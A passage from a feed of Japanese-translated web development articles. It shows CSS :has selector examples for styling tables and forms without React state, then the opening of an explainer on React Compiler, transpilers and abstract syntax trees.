<p>これをコードにすると、以下のようになります。</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token operator">...</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span><span class="token plain-text">
  </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span><span class="token plain-text">Socks</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span><span class="token plain-text">
  </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span><span class="token plain-text">Created by...</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span><span class="token plain-text">
  </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span><span class="token plain-text">Inventory full</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span><span class="token plain-text">
  </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>category<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token plain-text">
      clothes
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token plain-text">
  </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span><span class="token plain-text">
</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>
<span class="token operator">...</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>では、表の左側境界線にカテゴリを示す色を付けることで、各行のカテゴリを色分けしたいと思います。また、在庫切れの商品については、行の背景を赤く色付けすることで目立たせたいと思います。これを実装したものが以下になります。</p>
<p><img src="https://www.developerway.com/assets/replacing-react-with-css/example3-table-colors.png"></p>
<p>Reactでは、propsを使用し、カテゴリや在庫に関する情報を少なくとも<code class="language-text">row</code>タグ、あるいは最初のセルに渡す必要があります。さらに、バリエーションごとにクラス名や、場合によっては内部コンポーネントを作成する必要があります。この例では、こうした複雑な処理は一切不要です。</p>
<p>では、一連の流れを見てみましょう。</p>
<p>ステップ1。情報を格納した<code class="language-text">data-</code>属性を、すでにその情報を持っているセルに追加します。</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span><span class="token plain-text">
  </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span><span class="token plain-text">Socks</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span><span class="token plain-text">
  </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span><span class="token plain-text">Created by...</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span><span class="token plain-text">
  &lt;!-- add data-inventory attribute here -->
  </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">data-inventory</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>full<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token plain-text">Inventory full</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span><span class="token plain-text">
  </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span><span class="token plain-text">
    &lt;!-- add data-category attribute here -->
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>category<span class="token punctuation">"</span></span> <span class="token attr-name">data-category</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>clothes<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token plain-text">
      clothes
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token plain-text">
  </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span><span class="token plain-text">
</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>ステップ2。<code class="language-text">:has</code>を使用し、必要なカテゴリを色分けします。</p>
<p><code class="language-text">data-category</code>を持つ要素を含む行の最初のセルに、カテゴリによって異なる色の境界線を追加します。</p>
<div class="gatsby-highlight" data-language="css"><pre style="counter-reset: linenumber NaN" class="language-css line-numbers"><code class="language-css"><span class="token selector">.table tr:has([data-category='clothes']) td:first-child</span> <span class="token punctuation">{</span>
  <span class="token property">border-left</span><span class="token punctuation">:</span> 6px solid #f7bccb<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token selector">.table tr:has([data-category='office']) td:first-child</span> <span class="token punctuation">{</span>
  <span class="token property">border-left</span><span class="token punctuation">:</span> 6px solid #f4d592<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token selector">.table tr:has([data-category='animals']) td:first-child</span> <span class="token punctuation">{</span>
  <span class="token property">border-left</span><span class="token punctuation">:</span> 6px solid #c4f4ff<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p><code class="language-text">data-inventory</code>の値が<code class="language-text">empty</code>の要素を含む行には、赤色の背景を追加します。</p>
<div class="gatsby-highlight" data-language="css"><pre style="counter-reset: linenumber NaN" class="language-css line-numbers"><code class="language-css"><span class="token selector">.table tr:has([data-inventory='empty'])</span> <span class="token punctuation">{</span>
  <span class="token property">background</span><span class="token punctuation">:</span> #f6d0ce<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span></span></pre></div>
<p>美しく色分けされた表の出来上がりです。この表で特に素晴らしいのが、動的な状態にあり頻繁に更新される属性であっても、行全体を再レンダリングして色を更新する必要がない点です。再レンダリングされるのは<code class="language-text">data-</code>属性を含むセルだけです。よりシンプルで洗練されたコードに加え、この点も若干パフォーマンスの向上に寄与する可能性があります。</p>
<p>以下のインタラクティブな例をご覧ください。</p>
<iframe src="https://codesandbox.io/embed/z432ww?codemirror=1&amp;hidedevtools=0&amp;view=preview" style="width:100%;height:500px;border:0;border-radius:4px" allow="accelerometer; ambient-light-sensor; camera; encrypted-media; geolocation; gyroscope; hid; microphone; midi; payment; usb; vr; xr-spatial-tracking" sandbox="allow-forms allow-modals allow-popups allow-presentation allow-same-origin allow-scripts"></iframe>
<h2>:hasセレクタとフォーム</h2>
<p>次が今回紹介する<code class="language-text">:has</code>セレクタの最後のユースケースです。フォーム要素の状態に応じて要素のスタイリングを行うというものですが、これが大変効果的で筆者も非常に気に入っています。</p>
<p>例えば、入力を無効にできるフォームにおいて、入力欄のラベル表示や説明も視覚的に「無効」にすることができます。</p>
<p><img src="https://www.developerway.com/assets/replacing-react-with-css/example4-disabled-input.png"></p>
<p>このフォームを記述したコードが以下になります。</p>
<div class="gatsby-highlight" data-language="html"><pre style="counter-reset: linenumber NaN" class="language-html line-numbers"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>form<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>fieldset</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">htmlFor</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>form-name<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Name<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>form-name<span class="token punctuation">"</span></span> <span class="token attr-name">disabled</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Nadia<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>description<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Just your first name is fine<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>fieldset</span><span class="token punctuation">></span></span>

  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>fieldset</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">htmlFor</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>form-email<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Email Address<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>email<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>form-email<span class="token punctuation">"</span></span> <span class="token attr-name">required</span> <span class="token punctuation">/></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>description<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>We don't accept gmail domains!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>fieldset</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>CSSでは、stateが<code class="language-text">:disabled</code>の入力を含む<code class="language-text">fieldset</code>を指定し、<code class="language-text">label</code>要素と<code class="language-text">.description</code>要素のスタイリングを行います。</p>
<div class="gatsby-highlight" data-language="css"><pre style="counter-reset: linenumber NaN" class="language-css line-numbers"><code class="language-css"><span class="token selector">fieldset:has(input:disabled) label,
fieldset:has(input:disabled) .description</span> <span class="token punctuation">{</span>
  <span class="token property">color</span><span class="token punctuation">:</span> #d6d6d6<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span></span></pre></div>
<p>もちろん、フォーカスも使用できます。入力がフォーカスされると左側に線が表示されるようにしたい場合、</p>
<p><img src="https://www.developerway.com/assets/replacing-react-with-css/example5-focused-input.png"></p>
<p>次のようにするだけです。</p>
<div class="gatsby-highlight" data-language="css"><pre style="counter-reset: linenumber NaN" class="language-css line-numbers"><code class="language-css"><span class="token selector">fieldset:has(input:focus-visible)</span> <span class="token punctuation">{</span>
  <span class="token property">border-left</span><span class="token punctuation">:</span> 10px solid #c4f4ff<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span></span></pre></div>
<p>もしくは、チェックボックス付きのリストを実装する場合、チェックされた行を強調表示するには通常ならチェックボックスのstateを格納し、<code class="language-text">.active</code>クラスを作成しますが、こうした処理を行うことなく簡単に強調表示することが可能です。</p>
<p><img src="https://www.developerway.com/assets/replacing-react-with-css/example6-checkboxes.png"></p>
<p>必要なのはCSSセレクタだけです。</p>
<p>.list-with-checkboxes li:has(input:checked) {
background: rgba(196, 244, 255, 0.3);
}</p>
<p>こちらのライブプレビューをご覧ください。</p>
<iframe src="https://codesandbox.io/embed/m3dd7k?codemirror=1&amp;hidedevtools=0&amp;view=preview" style="width:100%;height:500px;border:0;border-radius:4px" allow="accelerometer; ambient-light-sensor; camera; encrypted-media; geolocation; gyroscope; hid; microphone; midi; payment; usb; vr; xr-spatial-tracking" sandbox="allow-forms allow-modals allow-popups allow-presentation allow-same-origin allow-scripts"></iframe>
<hr>
<p>素晴らしいと思いませんか？お気に入りの<code class="language-text">:has</code>の使い方がある方は、ぜひコメントで共有してください！</p>
<p>もちろん、セレクタを使用してReactコードを単純化する方法は他にもたくさんあります。ここに挙げたのは、筆者が特に気に入っているごく一部の例にすぎません。<code class="language-text">:has</code>セレクタについてもっと学び、色んな実例を試してみたい方は、例が豊富で内容的にも良い記事を以下に挙げていますので、ぜひ参照してみてください。</p>
<ul>
<li><a href="https://ishadeed.com/article/css-has-parent-selector/">CSS :has Parent Selector</a></li>
<li><a href="https://www.smashingmagazine.com/2021/06/has-native-css-parent-selector/">Meet :has, A Native CSS Parent Selector (And More) — Smashing Magazine</a></li>
<li><a href="https://www.smashingmagazine.com/2023/01/level-up-css-skills-has-selector/">Level Up Your CSS Skills With The :has() Selector — Smashing Magazine</a></li>
<li><a href="https://webkit.org/blog/13096/css-has-pseudo-class/">Using :has() as a CSS Parent Selector and much more</a></li>
<li><a href="https://www.bram.us/2022/11/17/style-a-parent-element-based-on-its-number-of-children-using-css-has/">Style a parent element based on its number of children using CSS :has()</a></li>
</ul>
<p>ここ数年のCSSの進歩を考えると、5年後くらいにはReactが必要なくなっているかもしれません。🤯もしそうなれば面白いですね！</p>]]></content:encoded></item><item><title><![CDATA[React Compilerについて理解する]]></title><description><![CDATA[Reactのコアアーキテクチャは、与えられた関数（すなわちコンポーネント）を繰り返し呼び出します。この仕組みはReactのメンタルモデルを単純化し、その人気に一役を買いましたが、同時にパフォーマンス…]]></description><link>https://postd.cc/understanding-react-compiler/</link><guid isPermaLink="false">https://postd.cc/understanding-react-compiler/</guid><category><![CDATA[開発手法・プロジェクト管理]]></category><category><![CDATA[React]]></category><pubDate>Fri, 27 Sep 2024 00:00:01 GMT</pubDate><content:encoded><![CDATA[<p>Reactのコアアーキテクチャは、与えられた関数（すなわちコンポーネント）を繰り返し呼び出します。この仕組みはReactのメンタルモデルを単純化し、その人気に一役を買いましたが、同時にパフォーマンスの問題が生じる原因にもなりました。関数のパフォーマンスコストが高いと、アプリの動作は総じて遅くなります。</p>
<p>開発者はReactにどの関数をいつ再実行するか手動で指示しなくてはならなかったため、パフォーマンスチューニングが悩みの種になっていました。Reactチームが最近リリースしたReact Compilerというツールは、コードを書き直すことにより、開発者が手動で行っていたパフォーマンスチューニングの作業を自動化します。</p>
<p>React Compilerはコードに何をするのでしょうか？裏ではどのような処理が行われるのでしょうか？使った方がいいのでしょうか？こうした疑問について詳しく見ていきたいと思います。</p>
<div class="admonition admonition-none alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg></svg></span>none</h5></div><div class="admonition-content"><p>Reactの内部実装について詳しく学び、完全で正確なメンタルモデルを得たい方は、<a href="https://understandingreact.com/">Understanding React</a>という筆者の新しいコースでReactのソースコードを掘り下げて説明していますので、ぜひチェックしてみてください。Reactの使用経験が豊富な開発者でも、内部実装の理解を深めることは大いに役立ちます。</p></div></div>
<h2>コンパイラ、トランスパイラ、オプティマイザ</h2>
<p>モダンJavaScriptのエコシステムでは、コンパイラ、トランスパイラ、オプティマイザという用語がよく聞かれます。これらは何でしょうか？</p>
<h3>トランスパイル</h3>
<p>トランスパイラとは、コードを解析し、同等の機能を持つコードを別のプログラミング言語で出力するか、調整を加えたコードを同じプログラミング言語で出力するプログラムです。</p>
<p>React開発者は何年も前からトランスパイラを使用し、JSXをJavaScriptエンジンが実際に実行するコードに変換してきました。JSXは、基本的にはネストされた関数のツリー（これらはネストされたオブジェクトツリーを構築）を作成するための省略記法です。</p>
<p>ネストされた関数を記述するのは面倒でミスが生じやすいため、JSXは開発者を大いに助けます。トランスパイラはJSXを解析し、関数に変換するために必要です。</p>
<p>例えば、JSXを使用して次のReactコードを記述したとします。</p>
<div class="admonition admonition-none alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg></svg></span>none</h5></div><div class="admonition-content"><p>読みやすさに配慮し、このブログ記事ではコードはすべて大幅に簡略化しています。</p></div></div>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token keyword">function</span> <span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Item</span></span> <span class="token attr-name">item</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>item<span class="token punctuation">}</span></span> <span class="token punctuation">/></span></span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">Item</span><span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">{</span> item <span class="token punctuation">}</span></span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span><span class="token plain-text">
            </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token punctuation">{</span> item<span class="token punctuation">.</span>desc <span class="token punctuation">}</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span><span class="token plain-text">
        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>
    <span class="token punctuation">)</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>これをトランスパイルすると、次のようになります。</p>
<div class="gatsby-highlight" data-language="js"><pre style="counter-reset: linenumber NaN" class="language-js line-numbers"><code class="language-js"><span class="token keyword">function</span> <span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token function">_jsx</span><span class="token punctuation">(</span>Item<span class="token punctuation">,</span> <span class="token punctuation">{</span>
    <span class="token literal-property property">item</span><span class="token operator">:</span> item
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">Item</span><span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">{</span> item <span class="token punctuation">}</span></span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token function">_jsx</span><span class="token punctuation">(</span><span class="token string">"ul"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
    <span class="token literal-property property">children</span><span class="token operator">:</span> <span class="token function">_jsx</span><span class="token punctuation">(</span><span class="token string">"li"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
      <span class="token literal-property property">children</span><span class="token operator">:</span> item<span class="token punctuation">.</span>desc
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>こちらが実際にブラウザに送られるコードです。HTMLのような構文ではなく、Reactでは「props」と呼ばれるプレーンなJavaScriptオブジェクトを渡す、ネストされた関数です。</p>
<div class="admonition admonition-none alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg></svg></span>none</h5></div><div class="admonition-content"><p>トランスパイルの結果は、JSX内でif文を簡単に使用できない理由を示しています。関数内ではif文を使用できません。</p></div></div>
<p><a href="none">Babel</a>を使用すればJSXを素早くトランスパイルし、出力結果を確認できます。</p>
<h3>コンパイルと最適化</h3>
<p>では、トランスパイラとコンパイラの違いは何でしょうか？　その答えは、回答者のバックグラウンドや経験によって異なるでしょう。コンピューターサイエンス分野を歩んできた人であれば、大抵はコンパイラと言えば記述したコードを機械語（プロセッサが理解できるバイナリコード）に変換するプログラムという認識だと思います。</p>
<p>しかし、トランスパイラは「source-to-source compilers」とも呼ばれます。オプティマイザは「最適化コンパイラ」とも呼ばれます。つまり、トランスパイラとオプティマイザもコンパイラの一種なのです。</p>
<p>物事に名前を付けるのは簡単ではありません。したがって、何をもってトランスパイラ、コンパイラ、あるいはオプティマイザと呼ぶのかについては意見の相違があるでしょう。理解すべき重要な点は、トランスパイラも、コンパイラも、オプティマイザも、コードが記述されたテキストファイルを解析し、同等の機能を持つ別のコードを新しいテキストファイルに出力するプログラムだということです。コードを改良する場合もあれば、別の人が書いたコードを呼び出すコールで自分のコードの一部をラップすることで、新しい機能を追加する場合もあります。</p>
<div class="admonition admonition-none alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg></svg></span>none</h5></div><div class="admonition-content"><p>トランスパイラ、コンパイラ、オプティマイザは、コードが記述されたテキストファイルを解析し、同等の機能を持つ別のコードを出力するプログラムです。</p></div></div>
<p>React Compilerが行うのは後者です。あなたが書いたコードと同等の機能を持つコードを作成しますが、他のReact開発者が書いたコードを呼び出すコールであなたのコードの一部をラップします。そうすることで、あなたが意図したことに加え、プラスアルファの機能を備えたコードに書き換えます。その「プラスアルファ」が何かについては後ほど説明します。</p>
<h3>抽象構文木（Abstract Syntax Trees）</h3>
<p>ここで言うコードの「解析」とは、コードを1文字ずつ構文解析し、アルゴリズムを実行することで、コードをどう調整し、書き換えるか、どのようにして機能を追加するかなどを明らかにすることを言います。通常、構文解析の結果は抽象構文木（AST）として出力されます。</p>
<p>そう言うと仰々しく聞こえますが、要はコードを分析しやすいようツリー構造で表したものです。</p>
<p>例えば、次の1行がコードに含まれていたとします。</p>
<div class="gatsby-highlight" data-language="js"><pre style="counter-reset: linenumber NaN" class="language-js line-numbers"><code class="language-js"><span class="token keyword">const</span> item <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token literal-property property">id</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token literal-property property">desc</span><span class="token operator">:</span> <span class="token string">'Hi'</span> <span class="token punctuation">}</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span></span></pre></div>
<p>これを抽象構文木で表すと、次のようになります。</p>
<div class="gatsby-highlight" data-language="js"><pre style="counter-reset: linenumber NaN" class="language-js line-numbers"><code class="language-js"><span class="token punctuation">{</span>
    <span class="token literal-property property">type</span><span class="token operator">:</span> VariableDeclarator<span class="token punctuation">,</span>
    <span class="token literal-property property">id</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token literal-property property">type</span><span class="token operator">:</span> Identifier<span class="token punctuation">,</span>
        <span class="token literal-property property">name</span><span class="token operator">:</span> Item
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token literal-property property">init</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token literal-property property">type</span><span class="token operator">:</span> ObjectExpression<span class="token punctuation">,</span>
        <span class="token literal-property property">properties</span><span class="token operator">:</span> <span class="token punctuation">[</span>
            <span class="token punctuation">{</span>
                <span class="token literal-property property">type</span><span class="token operator">:</span> ObjectProperty<span class="token punctuation">,</span>
                <span class="token literal-property property">key</span><span class="token operator">:</span> id<span class="token punctuation">,</span>
                <span class="token literal-property property">value</span><span class="token operator">:</span> <span class="token number">0</span>
            <span class="token punctuation">}</span><span class="token punctuation">,</span>
            <span class="token punctuation">{</span>
                <span class="token literal-property property">type</span><span class="token operator">:</span> ObjectProperty<span class="token punctuation">,</span>
                <span class="token literal-property property">key</span><span class="token operator">:</span> desc<span class="token punctuation">,</span>
                <span class="token literal-property property">value</span><span class="token operator">:</span> <span class="token string">'Hi'</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">]</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>生成されたデータ構造は、あなたが書いたコードを定義付けされた要素ごとに分解して説明します。各要素には、それがどういったものかを表す情報や、ひも付けされている値があればその値が含まれます。例えば、<code class="language-text">desc: 'Hi'</code>は<code class="language-text">ObjectProperty</code>であり、'desc'という<code class="language-text"> key</code>と'Hi'という<code class="language-text">value</code>がひも付けされています。</p>
<p>これが、トランスパイラやコンパイラなどがコードに対して行う処理について考える上でのメンタルモデルです。いずれも、あなたが書いたコード（テキストそのもの）をデータ構造に変換し、解析し、調整するために作成されたプログラムです。</p>
<p>最終的に生成されるコードはこのASTがもとになり、おそらくその他にもいくつかの中間言語が関与します。このデータ構造を繰り返し使用し、テキストを出力します（同じ言語で書かれた新しいコード、違う言語で書かれたコード、あるいは何らかの調整が加えられたコード）。</p>
<p>React Compilerは、ASTと中間言語の両方を使用し、あなたが書いたコードをもとに新しいReactコードを生成します。React自体がそうですが、React Compilerも「誰かが書いたコード」だということを忘れないでください。</p>
<p>コンパイラやトランスパイラ、オプティマイザなどのツールを謎めいたブラックボックスだとは考えないでください。時間さえあれば、自分にも作れるものだと考えましょう。</p>
<h2>Reactのコアアーキテクチャ</h2>
<p>React Compilerについて話す前に、明確にしておくべき概念があといくつかあります。</p>
<p>Reactのコアアーキテクチャがその人気の源泉であると同時に、パフォーマンスの問題の原因にもなり得ることはお話したかと思います。JSXを書く際、実際にはネストされた関数を記述しているのだということは説明した通りです。しかし、関数はReactに渡され、それをいつ呼び出すかはReactが判断します。</p>
<p>多数のアイテムを扱うReactアプリの最初の部分を例に見てみましょう。<code class="language-text">App</code>関数はいくつかのアイテムを取得し、<code class="language-text">List</code>関数はそれらを処理して表示すると仮定します。</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token keyword">function</span> <span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// TODO: fetch some items here</span>
    <span class="token keyword">return</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">List</span></span> <span class="token attr-name">items</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>items<span class="token punctuation">}</span></span> <span class="token punctuation">/></span></span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">List</span><span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">{</span> items <span class="token punctuation">}</span></span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> pItems <span class="token operator">=</span> <span class="token function">processItems</span><span class="token punctuation">(</span>items<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> listItems <span class="token operator">=</span> pItems<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">item</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token punctuation">{</span> item <span class="token punctuation">}</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
